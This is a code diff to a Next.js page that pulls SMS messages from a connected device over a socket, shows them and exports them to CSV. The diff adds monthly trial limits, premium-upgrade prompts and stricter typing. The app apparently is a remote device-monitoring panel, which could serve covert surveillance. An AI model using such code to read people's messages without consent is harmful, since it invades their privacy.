@@ -3,6 +3,8 @@
 import { useState, useEffect, useMemo } from 'react';
 import { useSearchParams, useRouter } from 'next/navigation';
 import { useNotification } from '@/context/NotificationProvider';
+import { useGlobalContext } from '@/context/GlobalProvider';
+import { consumeTrialAccess } from '@/lib/appwrite';
 import { initSocket, sendCommand, onResult, COMMANDS, disconnectSocket, SocketResult } from '@/lib/socket';
 import { exportToCSV } from '@/lib/utils';
 import { MessageSquare, ArrowLeft, Download, RefreshCw, Search, X, Copy, Check, ChevronRight } from 'lucide-react';
@@ -16,7 +18,8 @@ interface SMS {
 export default function SmsPage() {
     const searchParams = useSearchParams();
     const router = useRouter();
-    const { showSuccess, showError, showTimeout, showConnection } = useNotification();
+    const { showSuccess, showError, showTimeout, showConnection, showWarning, showPremium, showInfo } = useNotification();
+    const { user } = useGlobalContext();
 
     const deviceName = searchParams.get('name') || 'Device';
     const deviceId = searchParams.get('deviceId') || '';
@@ -26,19 +29,41 @@ export default function SmsPage() {
     const [searchQuery, setSearchQuery] = useState('');
     const [selectedSms, setSelectedSms] = useState<SMS | null>(null);
     const [copied, setCopied] = useState(false);
+    const [trialConsumed, setTrialConsumed] = useState(false);
 
+    const ensureTrialOnFirstUse = async () => {
+        if (trialConsumed) return true;
+        if (!user?.$id || !deviceId) {
+            showWarning('Trial Unavailable', 'Missing device or user details.');
+            return false;
+        }
+
+        const trial = await consumeTrialAccess(user.$id, deviceId, 'sms');
+        if (!trial.allowed) {
+            showWarning('Trial Limit Reached', trial.message);
+            showPremium('Premium Feature', 'SMS trial limit reached. Upgrade to continue.', () => router.push('/premium'));
+            return false;
+        }
+
+        setTrialConsumed(true);
+        showInfo('Trial Access Used', `${trial.usedCount}/${trial.maxUses} used for SMS this month.`);
+        return true;
+    };
     useEffect(() => {
         initSocket(deviceId);
         showConnection(true, 'Connected to device');
 
         onResult((data: SocketResult) => {
-            let smsArray = null;
+            let smsArray: unknown[] | null = null;
 
             if (data.smsList) {
                 if (Array.isArray(data.smsList)) {
                     smsArray = data.smsList;
-                } else if ((data.smsList as any).smsList) {
-                    smsArray = (data.smsList as any).smsList;
+                } else if (typeof data.smsList === 'object' && data.smsList && 'smsList' in data.smsList) {
+                    const nested = (data.smsList as { smsList?: unknown[] }).smsList;
+                    if (Array.isArray(nested)) {
+                        smsArray = nested;
+                    }
                 }
             }
 
@@ -57,7 +82,9 @@ export default function SmsPage() {
         return () => disconnectSocket();
     }, [deviceId]);
 
-    const handleRefresh = () => {
+    const handleRefresh = async () => {
+        const canUse = await ensureTrialOnFirstUse();
+        if (!canUse) return;
         setIsLoading(true);
         setSearchQuery('');
         sendCommand({
@@ -261,3 +288,6 @@ export default function SmsPage() {
         </div>
     );
 }
+
+
+
